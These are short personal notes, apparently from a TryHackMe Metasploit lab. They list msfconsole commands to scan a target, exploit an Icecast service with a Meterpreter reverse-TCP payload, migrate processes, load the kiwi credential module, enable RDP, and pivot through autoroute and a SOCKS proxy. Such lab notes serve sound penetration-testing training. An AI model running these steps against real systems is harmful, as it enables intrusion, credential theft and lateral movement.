# THM - Metasploit

```shell
Powershell: wsl --shutdown
```

```shell
sudo /etc/init.d/postgresql start

# sudo msfdb init	  # sudo msfdb reinit

sudo msfdb init

msfconsole
	db_status
	exit

msfconsole -h

msfconsole -q

msfconsole 
	help

	db_nmap -sV 10.10.252.37
	
	hosts
	
	services
	
	vulns
	
	use icecast
	
	search multi/handler
	
	use 5
	
	set PAYLOAD windows/meterpreter/reverse_tcp
	
	set LHOST tun0	# meter ip aqui 10.9.2.135
	 
	use icecast
	
	set RHOSTS 10.10.252.37
	
	exploit  		# run -j
	
	jobs
	
	sessions
	
	sessions -i 1

	ps

	migrate PID

	getuid

	sysinfo
	
	load kiwi
	
	getprivs
	
	upload

	run

	ipconfig
	
	run post/windows/gather/checkvm
	
	run post/multi/recon/local_exploit_suggester
	
	run post/windows/manage/enable_rdp
	
	shell
	
	run autoroute -h
	
	run autoroute -s 172.18.1.0 -n 255.255.255.0

	bg

	search server/socks

	proxychains
```
